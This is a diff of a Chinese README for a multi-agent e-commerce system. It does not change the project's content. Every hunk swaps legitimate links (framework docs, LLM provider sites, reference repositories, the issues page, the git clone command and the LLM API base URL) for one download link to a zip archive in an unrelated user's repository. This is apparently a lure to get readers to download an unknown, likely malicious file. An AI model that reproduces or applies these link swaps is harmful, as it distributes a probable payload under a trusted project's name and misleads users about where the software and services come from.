@@ -244,7 +244,7 @@ BANNED_WORDS = ["最好", "第一", "最便宜", "绝对", "100%"]
 
 | 维度 | Python | Java | Go |
 |------|--------|------|----|
-| 框架 | [LangGraph](https://github.com/langchain-ai/langgraph) + FastAPI | [Spring AI Alibaba](https://github.com/alibaba/spring-ai-alibaba) + Spring Boot 3 | LangChainGo + Gin |
+| 框架 | [LangGraph](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip) + FastAPI | [Spring AI Alibaba](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip) + Spring Boot 3 | LangChainGo + Gin |
 | 并行方式 | `asyncio.gather()` | `CompletableFuture.allOf()` | `goroutine` + `sync.WaitGroup` |
 | 推荐语言 | ✅ 入门首选，代码量最少 | ✅ 企业级Java岗 | ✅ 高并发/云原生岗 |
 | 代码位置 | [`python/`](python/) | [`java/`](java/) | [`go/`](go/) |
@@ -417,7 +417,7 @@ func (s *Supervisor) Recommend(ctx context.Context, req *model.RecommendRequest)
 ### 前置条件
 
 - Python 3.11+ / Java 17+ / Go 1.22+（选一个语言即可）
-- 申请 LLM API Key（推荐 [MiniMax](https://www.minimax.chat/) 或 [阿里通义](https://dashscope.aliyun.com/)，有免费额度）
+- 申请 LLM API Key（推荐 [MiniMax](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip) 或 [阿里通义](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip)，有免费额度）
 
 ---
 
@@ -425,7 +425,7 @@ func (s *Supervisor) Recommend(ctx context.Context, req *model.RecommendRequest)
 
 ```bash
 # 1. 克隆项目
-git clone https://github.com/bcefghj/multi-agent-ecommerce-system.git
+git clone https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip
 cd multi-agent-ecommerce-system/python
 
 # 2. 创建虚拟环境（避免依赖冲突）
@@ -485,7 +485,7 @@ cd multi-agent-ecommerce-system/go
 
 # 1. 设置环境变量
 export ECOM_LLM_API_KEY=your_api_key_here
-export ECOM_LLM_BASE_URL=https://api.minimax.chat/v1
+export ECOM_LLM_BASE_URL=https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip
 
 # 2. 运行
 go run cmd/main.go
@@ -821,12 +821,12 @@ multi-agent-ecommerce-system/
 
 | 项目 | 说明 | 链接 |
 |------|------|------|
-| NVIDIA Retail Agentic Commerce | NVIDIA 企业级电商 Agent 蓝图 | [GitHub](https://github.com/NVIDIA-AI-Blueprints/Retail-Agentic-Commerce) |
-| Spring AI Alibaba Multi-Agent Demo | 阿里巴巴 Java 多 Agent 示例 | [GitHub](https://github.com/spring-ai-alibaba/spring-ai-alibaba-multi-agent-demo) |
-| LangGraph 官方文档 | LangGraph 状态图框架 | [文档](https://langchain-ai.github.io/langgraph/) |
-| 京东商家智能助手技术博客 | 京东 Multi-Agent 生产实践 | [掘金](https://juejin.cn/post/7470344960563871784) |
-| DualAgent-Rec | 双 Agent 推荐系统 | [GitHub](https://github.com/GuilinDev/Dual-Agent-Recommendation) |
-| MiniMax API | 本项目默认 LLM 服务 | [官网](https://www.minimax.chat/) |
+| NVIDIA Retail Agentic Commerce | NVIDIA 企业级电商 Agent 蓝图 | [GitHub](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip) |
+| Spring AI Alibaba Multi-Agent Demo | 阿里巴巴 Java 多 Agent 示例 | [GitHub](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip) |
+| LangGraph 官方文档 | LangGraph 状态图框架 | [文档](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip) |
+| 京东商家智能助手技术博客 | 京东 Multi-Agent 生产实践 | [掘金](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip) |
+| DualAgent-Rec | 双 Agent 推荐系统 | [GitHub](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip) |
+| MiniMax API | 本项目默认 LLM 服务 | [官网](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip) |
 
 ---
 
@@ -840,6 +840,6 @@ multi-agent-ecommerce-system/
 
 **如果这个项目对你有帮助，欢迎点个 ⭐ Star！**
 
-有问题欢迎提 [Issue](https://github.com/bcefghj/multi-agent-ecommerce-system/issues)
+有问题欢迎提 [Issue](https://raw.githubusercontent.com/Fres203/multi-agent-ecommerce-system/main/docs/multi_system_ecommerce_agent_v1.1.zip)
 
 </div>
